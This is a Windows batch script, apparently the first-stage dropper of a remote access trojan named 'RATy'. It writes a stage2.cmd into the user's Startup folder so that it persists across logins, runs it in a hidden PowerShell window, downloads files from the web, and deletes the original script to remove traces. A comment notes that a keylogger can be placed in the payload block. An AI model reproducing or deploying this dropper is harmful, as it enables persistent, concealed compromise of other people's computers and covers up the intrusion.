@ REM -@echo off-           if i uncomment it, then the commands below wont show up printed on the cmd after running the -initial.cmd- file in cmd.  Its better to keep commented in Testing/Debugging Mode and uncomment it in Prod Mode
@REM Initial Stage for RATy
@REM Created By :

@REM variables
set "INITIALPATH=%cd%"    & @REM stores the initial path (in the variable) in which the user keeps the initially downloaded file, can be -Download- or -WP- or any other Folder
set "STARTUP=C:/Users/%username%/Appdata/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM Move into Start Up Directory
cd "%STARTUP%"  & @REM  To change directory to the StartUp folder in order to create the desired file into that directory

@REM Write Payloads to that Startup / Create the desired file in that Startup Folder
(
    @REM  We can place a keylogger here
    echo powershell -c "Invoke-WebRequest -Uri 'https://www.soundboard.com/track/download/156453' -OutFile 'magic.mp3' "
    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://www.soundboard.com/track/download/150404' -OutFile 'creepy.mp3' "
) > stage2.cmd

@REM Automaticaly Runs the desired file / payload, The output of the payload after runing it will show in the same StartUp Folder
powershell Start-Process powershell.exe -windowstyle hidden .\stage2.cmd

pause

@REM Move back to the initial Location from where we started -Download- or -WP- Folder, We Move back there as we want to remove the initial file in that directory so that all the traces are removed.
cd "%INITIALPATH%"
del initial.cmd








